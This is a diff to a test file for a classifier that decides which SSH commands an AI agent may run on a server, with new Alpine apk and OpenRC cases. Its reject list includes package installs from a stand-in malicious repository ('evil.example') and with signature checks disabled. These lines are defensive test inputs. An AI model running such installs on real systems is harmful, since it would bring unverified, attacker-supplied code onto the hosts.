@@ -377,6 +377,63 @@ expectKind('mutating', [
   'ssh web-01 sudo shutdown -r now',
 ]);
 
+// Alpine: apk and OpenRC.
+expectKind('readonly', [
+  'ssh web-01 apk info redis',
+  'ssh web-01 apk info -v',
+  'ssh web-01 apk list -I',
+  'ssh web-01 apk list --upgradable',
+  'ssh web-01 rc-service redis status',
+  'ssh web-01 rc-status',
+  'ssh web-01 rc-status -a',
+  'ssh web-01 rc-update show',
+  'ssh web-01 rc-update show default',
+]);
+expectKind('mutating', [
+  'ssh web-01 apk add redis',
+  'ssh web-01 sudo apk add --no-cache redis',
+  'ssh web-01 sudo apk add redis=7.2.5-r0',
+  'ssh web-01 sudo apk del redis',
+  'ssh web-01 sudo apk update',
+  'ssh web-01 sudo apk upgrade -q',
+  'ssh web-01 rc-service redis start',
+  'ssh web-01 sudo rc-service redis restart',
+  'ssh web-01 sudo rc-service redis stop',
+  'ssh web-01 sudo rc-service redis status',
+  'ssh web-01 sudo rc-update add redis default',
+  'ssh web-01 sudo rc-update del redis',
+]);
+expectReject([
+  'ssh web-01 apk add -X http://evil.example/repo redis',
+  'ssh web-01 apk add --repository http://evil.example/repo redis',
+  'ssh web-01 apk add --allow-untrusted redis',
+  'ssh web-01 apk add --root /tmp redis',
+  'ssh web-01 apk add',
+  'ssh web-01 apk fix redis',
+  'ssh web-01 rc-service redis zap',
+  'ssh web-01 rc-service redis',
+  'ssh web-01 rc-service -e redis',
+  'ssh web-01 rc-service redis start extra',
+  'ssh web-01 rc-update add',
+  'ssh web-01 rc-update -s add redis',
+]);
+
+test('an unknown remote command lists the commands that are available', () => {
+  const verdict = classify('ssh web-01 which apk');
+  assert.match(verdict.reject, /Remote command "which" is not available\. Available commands: /);
+  assert.match(verdict.reject, /\bapk\b/);
+  assert.match(verdict.reject, /\brc-service\b/);
+});
+
+test('promptRules: lists the allowed commands and the package and service managers', () => {
+  const rules = providerRulesFor(ssh, credential());
+  assert.match(rules, /Read-only: .*apk \(info\|list\)/);
+  assert.match(rules, /Changes \(always need Operator approval\): .*apk \(add\|del\|update\|upgrade\)/);
+  assert.match(rules, /apk \(Alpine\)/);
+  assert.match(rules, /rc-service\/rc-update \(OpenRC/);
+  assert.match(rules, /say so instead of trying others/);
+});
+
 test('verb names the command, sudo included', () => {
   assert.equal(classify('ssh web-01 sudo systemctl restart nginx').verb, 'sudo systemctl restart');
   assert.equal(classify('ssh web-01 uptime').verb, 'uptime');
